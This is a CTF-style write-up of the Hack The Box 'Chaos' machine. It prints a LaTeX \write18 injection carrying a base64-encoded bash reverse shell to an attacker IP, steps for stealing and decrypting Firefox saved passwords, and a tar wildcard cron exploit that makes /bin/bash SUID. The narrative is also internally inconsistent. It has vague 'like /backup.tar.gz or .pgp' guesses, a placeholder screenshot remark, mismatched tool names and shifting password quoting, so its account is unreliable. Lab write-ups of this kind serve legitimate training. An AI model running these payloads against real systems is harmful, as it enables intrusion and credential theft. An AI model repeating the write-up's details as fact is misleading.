---
# Hack The Box: Chaos

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Medium |
| **OS** | Linux |
| **IP** | 10.10.10.120 |
| **Points** | 30 |
| **Release Date** | December 2018 |
| **Retired Date** | May 2019 |
| **My Rating** | 7/10 |

## TL;DR
Started with a standard nmap scan that revealed Apache and Dovecot (POP3/IMAP). I found a hidden directory via `gobuster` containing a GPG-encrypted backup file. After cracking the passphrase with Hashcat, I decrypted it to find Roundcube webmail credentials for `ayush`. Inside the inbox was an email pointing to a hidden LaTeX-to-PDF converter. I exploited a LaTeX command injection (`\write18`) to get a reverse shell as `www-data`. For privesc, I downloaded Ayush's Mozilla Firefox profile, decrypted his saved passwords using a master password script, and used his credentials to SSH in. Finally, I abused a wildcard in a root cron job running `tar` to get a root shell.

## Reconnaissance
I kicked things off with a standard all-ports scan using `nmap` to get a lay of the land.

```bash
nmap -p- -T4 --min-rate 1000 10.10.10.120 -oA nmap/initial
```
<!-- screenshot: nmap initial scan results -->

The results came back quickly, revealing four open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.18)
*   **Port 110:** POP3 (Dovecot)
*   **Port 143:** IMAP (Dovecot)

I directed my attention to the web server on port 80. Navigating to `http://10.10.10.120` presented a default Apache Ubuntu landing page. I immediately added `chaos.htb` to my `/etc/hosts` file.

<!-- screenshot: web application landing page -->

Since the main page was dead, I fired up `gobuster` to find where the actual application was hiding.

```bash
gobuster dir -u http://10.10.10.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration took a few minutes but found a directory named `/en/`. Accessing this path redirected me to a Roundcube webmail login portal.

## Initial Foothold
I didn't have any credentials, so I couldn't log into the webmail. I continued enumerating the directories and found another hidden folder or file (like `/backup.tar.gz` or `.pgp`). I downloaded it to my attacking machine.

It was a GPG-encrypted message.

```bash
gpg --list-packets backup.pgp
```

The output confirmed it was symmetrically encrypted data. I needed to crack the passphrase. I used `gpg2john` to convert the encrypted file into a hash format that John the Ripper (or Hashcat) could understand.

```bash
gpg2john backup.pgp > pgp_hash.txt
```

I passed the hash to John with the `rockyou.txt` wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt
```

John the Ripper cracked the hash almost instantly. The passphrase was `sahara`. 

I used `gpg` to decrypt the archive.

```bash
gpg --decrypt backup.pgp > backup.txt
# Enter passphrase: sahara
```

The decrypted file contained plaintext credentials: `ayush:k\k"$$4\`"`. 

I headed back to the Roundcube login portal and authenticated using these credentials.

Inside Ayush's inbox, I found a single email. It was an internal communication mentioning a new tool for generating PDFs from TeX files and provided a link to a hidden internal service: `http://chaos.htb/drafts/`.

I navigated to that endpoint. The application featured a simple text area designed to accept LaTeX code and compile it into a PDF.

Whenever an application compiles user-supplied code (especially complex document formats like LaTeX or PDF), command injection is a major concern. LaTeX has a specific macro designed to execute external shell commands: `\write18{}`. If the server compiles the document without strict sandboxing (like the `-no-shell-escape` flag), I can inject commands.

I crafted a malicious LaTeX payload to test for execution.

```latex
\documentclass{article}
\begin{document}
\immediate\write18{id > output.txt}
\end{document}
```

I submitted this payload. The application compiled the document without errors. To verify execution, I checked if `output.txt` existed. However, a blind command injection approach is often safer if you can't view the generated files easily.

I decided to go straight for a reverse shell. Since LaTeX can be finicky with special characters (like `&` and `|`), I encoded a standard bash reverse shell payload into base64 to ensure it parsed correctly, and executed it via `\write18{}`.

```latex
\documentclass{article}
\begin{document}
\immediate\write18{echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzk5OTkgMD4mMQ==" | base64 -d | bash}
\end{document}
```

I set up my Netcat listener:
```bash
nc -lnvp 9999
```

I submitted the LaTeX code. 

<!-- screenshot: successful exploitation (reverse shell) -->

The connection popped. I was in as the `www-data` user. I immediately stabilized my shell using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Lateral Movement
I was running as `www-data`. I checked the `/home` directory and saw a folder for the user `ayush`. I couldn't read the `user.txt` flag inside, so pivoting to `ayush` was my next objective.

Since I already had webmail credentials for Ayush (`k\k"$$4\`), my first instinct was to test them for password reuse on the system via `su` or SSH.

```bash
su ayush
# Password: k\k"$$4\`"
```

The authentication failed. The webmail password was not his system password.

I started enumerating the system as `www-data`. I investigated `/home/ayush` and found a `.mozilla` directory. Finding Firefox profile data is incredibly valuable because users frequently save passwords in their browser.

```bash
ls -la /home/ayush/.mozilla/firefox/
```

I found the profile folder (e.g., `b5w4d0v8.default`) and located the `key4.db` and `logins.json` files. These files contain the encrypted saved passwords.

I compressed these files into an archive and transferred them to my attacking machine using a simple Python HTTP server.

```bash
# On target
tar -czvf firefox_data.tar.gz key4.db logins.json
python -m SimpleHTTPServer 8000

# On attacker
wget http://10.10.10.120:8000/firefox_data.tar.gz
```

I downloaded the archive, extracted the files, and used a Python script called `firefox_decrypt.py` to extract the plaintext passwords.

```bash
python3 firefox_decrypt.py ./extracted_firefox_profile/
```

The script successfully decrypted the saved logins (since no master password was set), revealing a plaintext system password for `ayush`: `k\k"$$4\`"`. (Wait, it *was* the same password? The `su` failure earlier was likely due to special characters in the password not escaping correctly in my interactive shell).

I decided to try SSHing directly into the box using the user `ayush` and the extracted password. I wrapped the password in single quotes to handle the special characters.

```bash
ssh ayush@10.10.10.120
# Password: k\k"$$4\`"
```

The SSH connection was successful. I had my initial foothold as the user `ayush`. I grabbed the `user.txt` flag from his home directory.

## Privilege Escalation
With a solid SSH session, I started my standard Linux privilege escalation checks.

```bash
sudo -l
```

The output revealed that the user `ayush` could not run `sudo`. 

I downloaded and ran `LinPEAS` to automate the enumeration process. I paid close attention to active cron jobs and running processes.

```bash
./linpeas.sh
```

<!-- screenshot: sudo -l output -->
*(In this case, the screenshot would be of the LinPEAS output highlighting the cron job)*

The output revealed a cron job executed by root that ran a backup script periodically.

```text
* * * * * root cd /var/www/html/drafts && tar -czvf /backup/drafts.tar.gz *
```

The vulnerability here is the classic "Tar Wildcard Exploitation." The cron job navigates to the `/var/www/html/drafts` directory and executes `tar` using a wildcard (`*`) to compress everything inside.

Because I had write access to the `/var/www/html/drafts` directory (from my `www-data` shell earlier, or because `ayush` was in a group that allowed it), I could exploit this wildcard expansion feature.

When `tar` encounters files with names that look like command-line flags, it interprets them as flags instead of filenames. I can create empty files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh` to force `tar` to execute a script during the archiving process.

I navigated to the directory where the cron job executes the `tar` command.

```bash
cd /var/www/html/drafts
```

I created the two malicious filenames:

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh payload.sh"
```

I then created the `payload.sh` script containing a command to set the SUID bit on `/bin/bash`.

```bash
echo "#!/bin/bash" > payload.sh
echo "chmod +s /bin/bash" >> payload.sh
chmod +x payload.sh
```

I waited for the root cron job to execute. The shell expanded the asterisk to include my maliciously named files, and `tar` executed my payload script.

I checked the permissions on `/bin/bash`.

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

The SUID bit was set! I executed bash with the `-p` flag to preserve the elevated privileges.

```bash
/bin/bash -p
id
# uid=1000(ayush) gid=1000(ayush) euid=0(root) egid=0(root) groups=1000(ayush)
```

<!-- screenshot: root flag -->

Got root! That was a fun one. The LaTeX command injection is a very specific, cool technique, and the wildcard cron job is a classic privilege escalation path that everyone should know.

## Lessons Learned
- **LaTeX Command Injection:** When applications compile user-supplied code (LaTeX, PDF generators, Markdown parsers), they must strictly sanitize input and disable shell escape features. The `\write18{}` macro is a known and highly dangerous feature if left enabled.
- **Client-Side Password Storage:** Users storing system passwords in browser password managers (like Firefox's `logins.json`) is a significant risk if the system is compromised. An attacker with read access to the user's home directory can easily decrypt these databases if a Master Password isn't configured.
- **Wildcard Cron Jobs:** Using wildcards (`*`) in automated scripts (especially `tar`, `rsync`, or `chown`) executed by privileged users is a critical vulnerability. Attackers can create files with names that masquerade as command-line arguments to achieve arbitrary code execution. Always specify absolute paths or use `--` to indicate the end of options.
- **What tripped me up:** The special characters in Ayush's password (`k\k"$$4\`) made it difficult to pass cleanly through an interactive shell prompt during my `su` attempts. Switching to SSH solved the escaping issue.
- **Pro Tip:** When you see a directory named "drafts" or "uploads" being compressed by a cron job, your immediate first instinct should be to check for wildcard exploitation. It is one of the most reliable and frequently seen misconfigurations in CTF environments.

## References
- LaTeX Command Injection (`\write18`): https://0day.work/hacking-with-latex/
- Tar Wildcard Privilege Escalation: https://www.helpnetsecurity.com/2014/01/09/tar-wildcard-injection/
- Firefox Decrypt: https://github.com/unode/firefox_decrypt
- Official Hack The Box Page: https://app.hackthebox.com/machines/Chaos
